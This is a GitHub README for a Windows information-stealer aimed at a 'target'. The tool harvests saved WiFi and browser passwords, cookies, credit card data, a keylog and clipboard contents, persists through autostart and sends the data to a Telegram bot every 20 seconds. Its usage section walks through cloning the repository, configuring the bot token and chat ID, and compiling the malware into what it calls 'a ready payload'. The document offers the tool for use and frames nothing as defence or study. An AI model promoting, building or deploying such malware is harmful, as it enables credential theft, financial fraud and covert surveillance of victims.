# InfoStealer

InfoStealer for windows that gathers system, browser data and is a keylogger

## Features

### Program Gathers:

#### System information:

- External IP
- network adapters
- saved WiFi passwords (plaintext)
- Windows product key
- installed antivirus
- domain membership

#### Chromium browsers data:

- Saved passwords (Login Data) - using Chrome-App-Bound-Encryption-Decryption
- Cookies
- Autofill data (Web Data)
- Browsing history
- Credit card data
- Browser extensions

### Keylogger

Program logs every keystroke made by target

### Clipboard

Program logs every clipboard copy made by target

### AutoStart

Programs starts automatically when target opens their system

### Sending data via Telegram

Program every 20 seconds sends data that had been harvested

## Usage

Run:

`git clone https://github.com/Jimi090/InfoStealer.git`

`cd InfoStealer`

Create a Telegram Bot:

1. Install Telegram
2. Go to `u/BotFather` on Telegram
3. Send `/newbot`
4. Follow the steps to get your token
5. Send `/start` to your bot
6. Send random message to your bot e.g. `aaa`
7. Go to `https://api.telegram.org/bot{YOUR_BOT_TOKEN}/getUpdates` to get your chat_id
8. Make .env file with
   `TELEGRAM_TOKEN=YOUR_TOKEN`
   `CHAT_ID=YOUR_CHAT_ID`

Compile the script:

`pip install pyinstaller`

`python.exe -m PyInstaller --one-file  .\main.py`

Result file is a ready payload :)

## Third-party software

This project includes third-party software:

- **Chrome-App-Bound-Encryption-Decryption** — Copyright (c) 2025 Alexander 'xaitax' Hagenah — MIT License.
- **SQLite** — public-domain software; copyright is disclaimed by the SQLite source.

See [`THIRD-PARTY-NOTICES.txt`](THIRD-PARTY-NOTICES.txt) for the applicable notices.
